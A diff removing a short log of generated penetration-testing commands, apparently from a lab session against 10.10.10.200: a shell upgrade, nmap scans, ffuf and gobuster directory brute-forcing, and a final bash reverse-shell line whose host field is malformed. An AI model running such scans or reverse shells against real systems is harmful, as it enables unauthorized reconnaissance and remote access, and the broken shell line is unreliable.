@@ -1,7 +1,0 @@
-[2025-12-25 15:22:52] CMD GENERADO: script /dev/null -c bash
-[2025-12-25 15:51:15] CMD GENERADO: nmap -F 10.10.10.200 -oN scan_fast.txt
-[2025-12-25 15:53:51] CMD GENERADO: nmap -p- -sV -sC 10.10.10.200 -oN scan_full.txt
-[2025-12-25 15:54:04] CMD GENERADO: nmap -p- -sV -sC 10.10.10.200 -oN scan_full.txt
-[2025-12-25 16:38:15] CMD GENERADO: ffuf -u http://10.10.10.200/FUZZ -w /usr/share/wordlists/dirb/common.txt
-[2025-12-25 16:41:29] CMD GENERADO: gobuster dir -u http://10.10.10.200 -w /usr/share/wordlists/dirb/common.txt
-[2025-12-25 16:41:38] CMD GENERADO: bash -i >& /dev/tcp/21221/4444 0>&1
